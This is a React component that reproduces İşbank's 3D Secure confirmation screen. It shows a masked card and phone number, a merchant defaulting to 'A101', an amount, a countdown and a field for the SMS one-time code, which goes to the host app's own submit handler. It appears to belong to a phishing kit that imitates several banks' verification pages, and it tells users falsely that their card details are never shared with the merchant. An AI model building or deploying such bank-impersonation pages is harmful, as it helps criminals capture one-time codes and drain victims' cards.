'use client';

import {
  FiCalendar,
  FiCreditCard,
  FiShoppingBag,
} from 'react-icons/fi';
import CardSchemeBadge from '@/components/CardSchemeBadge';
import BankLogo from '@/components/banks/logos/BankLogo';
import ThreeDSecureShell from './ThreeDSecureShell';
import {
  formatAmount,
  maskCardIsbank,
  maskPhoneIsbank,
} from './threeDSecureUtils';
import { useCountdownTimer } from './useCountdownTimer';
import type { BankThreeDSecureProps } from './types';

export default function IsBankThreeDSecurePage({
  amount,
  cardNumber,
  phoneNumber,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName = 'A101',
  onSubmit,
  onResendCode,
  onCancel,
}: BankThreeDSecureProps) {
  const formattedAmount = formatAmount(amount);
  const { secondsLeft } = useCountdownTimer(180);
  const progress = Math.max(0, Math.min(100, (secondsLeft / 180) * 100));

  return (
    <ThreeDSecureShell onClose={onCancel}>
      <div className="pb-5">
        <div className="flex h-[6rem] items-center justify-center bg-[#d4147a] px-2 sm:h-[7rem]">
          <BankLogo bankId="isbank" variant="maximum-header" height={108} className="mx-auto w-full" />
        </div>

        <div className="bg-[#e8e8e8] px-4 py-2 text-center text-xs font-bold tracking-wide text-gray-800">
          KART NUMARANIZ: {maskCardIsbank(cardNumber)}
        </div>

        <div className="space-y-2 px-4 py-3">
          <div className="flex items-center gap-2 text-[13px] text-gray-800">
            <FiShoppingBag className="shrink-0 text-gray-500" size={14} />
            <span>{merchantName.toUpperCase()}</span>
          </div>
          <div className="flex items-center gap-2 text-[13px] text-gray-800">
            <FiCreditCard className="shrink-0 text-gray-500" size={14} />
            <span className="font-semibold">{formattedAmount} TL</span>
          </div>
          <div className="flex items-center gap-2 text-[13px] text-gray-800">
            <FiCalendar className="shrink-0 text-gray-500" size={14} />
            <span>{transactionDate}</span>
          </div>
        </div>

        <div className="px-4 pb-4">
          <p className="mb-4 text-center text-[13px] leading-relaxed text-gray-800">
            <span className="font-semibold">{maskPhoneIsbank(phoneNumber)}</span> numaralı telefonunuza
            gönderilen mobil onay kodunu girerek işleminizi onaylayabilirsiniz.
          </p>

          {error && (
            <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-center text-xs text-red-600">
              {error}
            </div>
          )}

          <form onSubmit={onSubmit}>
            <input
              type="password"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={verificationCode}
              onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
              placeholder="Doğrulama Kodu"
              className="mb-3 w-full rounded border border-gray-300 px-4 py-3 text-sm outline-none focus:border-[#003087]"
            />

            <button
              type="submit"
              disabled={loading || verificationCode.length < 4}
              className="mb-2 w-full rounded bg-[#003087] py-3 text-sm font-bold text-white disabled:bg-gray-300"
            >
              {loading ? 'Gönderiliyor...' : 'Onayla'}
            </button>

            <button
              type="button"
              onClick={onResendCode}
              className="mb-4 w-full rounded bg-[#9e9e9e] py-3 text-sm font-bold text-white"
            >
              Kodu Tekrar Gönder
            </button>

            <div className="mb-4 flex justify-between text-sm text-[#003087]">
              <button type="button" onClick={onCancel} className="hover:underline">
                İşlemi İptal Et
              </button>
              <button type="button" className="hover:underline">
                Yardım
              </button>
            </div>

            <div className="relative mb-1 h-2 overflow-hidden rounded-full bg-gray-200">
              <div
                className="h-full rounded-full bg-[#003087] transition-all duration-1000"
                style={{ width: `${progress}%` }}
              />
              <span className="absolute right-0 top-1/2 -translate-y-1/2 pr-1 text-[10px] font-bold text-[#003087]">
                {secondsLeft}
              </span>
            </div>
          </form>
        </div>

        <div className="border-t border-gray-200 px-4 pt-4">
          <p className="mb-3 text-center text-[10px] font-semibold uppercase tracking-wide text-gray-500">
            Kart bilgileriniz işyeri ile kesinlikle paylaşılmamaktadır.
          </p>
          <div className="flex items-center justify-center gap-3">
            <CardSchemeBadge cardNumber={cardNumber} compact />
            <BankLogo bankId="isbank" height={20} />
          </div>
        </div>
      </div>
    </ThreeDSecureShell>
  );
}
